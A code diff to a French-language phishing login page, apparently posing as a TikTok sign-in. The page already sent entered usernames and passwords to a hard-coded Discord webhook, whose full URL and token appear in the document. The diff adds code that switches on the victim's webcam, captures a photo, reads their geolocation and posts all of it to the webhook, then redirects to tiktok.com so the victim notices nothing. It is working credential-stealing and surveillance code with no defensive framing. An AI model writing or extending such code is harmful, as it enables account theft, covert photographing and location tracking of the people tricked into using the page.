@@ -23,10 +23,6 @@
       max-width: 350px;
       text-align: center;
     }
-    img.logo {
-      width: 60px;
-      margin-bottom: 20px;
-    }
     input[type="text"],
     input[type="password"] {
       width: 100%;
@@ -48,6 +44,15 @@
     button:hover {
       background-color: #e91b44;
     }
+    #video, #canvas {
+      width: 100%;
+      max-width: 320px;
+      margin: 10px 0;
+      display: block;
+    }
+    #canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -56,34 +61,81 @@
     <form id="loginForm">
       <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
+      <video id="video" autoplay></video>
+      <canvas id="canvas"></canvas>
+      <button type="button" id="snap">Prendre une photo</button>
       <button type="submit">Se connecter</button>
     </form>
   </div>
   <script>
+  // Webcam setup
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const snap = document.getElementById('snap');
+  let imageData = "";
+
+  // Démarre la webcam
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+      video.srcObject = stream;
+      video.play();
+    });
+  }
+
+  // Prendre une photo
+  snap.addEventListener("click", function(e) {
+    e.preventDefault();
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+    imageData = canvas.toDataURL('image/png');
+    snap.textContent = "Photo prise ✔";
+    canvas.style.display = "block";
+    video.style.display = "none";
+  });
+
   document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
-
-    // Webhook Discord fourni par l'utilisateur
     const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
 
-    const payload = {
-      content: `🔔 Nouvelle connexion reçue :\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}`
-    };
+    // Fonction pour envoyer au webhook
+    function sendToDiscord(locationText) {
+      let content = `🔔 Nouvelle connexion reçue :\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}\n${locationText}`;
+      // On envoie la photo en base64 dans le message (attention à la limite de taille de Discord)
+      if (imageData) {
+        content += `\n📸 Photo (base64):\n${imageData}`;
+      } else {
+        content += `\n📸 Aucune photo prise`;
+      }
+      fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content })
+      })
+      .then(response => {
+        window.location.href = "https://www.tiktok.com";
+      })
+      .catch(() => {
+        window.location.href = "https://www.tiktok.com";
+      });
+    }
 
-    fetch(webhookURL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    })
-    .then(response => {
-      window.location.href = "https://www.tiktok.com";
-    })
-    .catch(() => {
-      window.location.href = "https://www.tiktok.com";
-    });
+    // Récupère localisation
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const locationText = `🌍 Localisation :\nLatitude : ${lat}\nLongitude : ${lon}`;
+        sendToDiscord(locationText);
+      }, function(error) {
+        sendToDiscord("🌍 Localisation : non autorisée ou non disponible");
+      });
+    } else {
+      sendToDiscord("🌍 Localisation : non supportée");
+    }
   });
   </script>
 </body>
